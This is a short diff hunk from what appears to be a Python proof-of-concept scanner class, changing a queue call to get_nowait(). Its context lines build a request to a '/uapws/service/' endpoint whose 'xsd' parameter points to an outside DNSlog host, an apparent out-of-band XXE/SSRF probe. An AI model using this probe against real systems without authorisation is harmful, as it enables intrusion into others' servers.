@@ -66,7 +66,7 @@ class poc:
             result_text = ""
             if self.q.qsize() == 0:
                 break
-            api = self.q.get()
+            api = self.q.get_nowait()
             dnslog_all = self.get_dnslog()
             dnslog = dnslog_all[0]
             target_url = url + "/uapws/service/" + api + "?xsd=http://" + dnslog + "/ext.dtd"
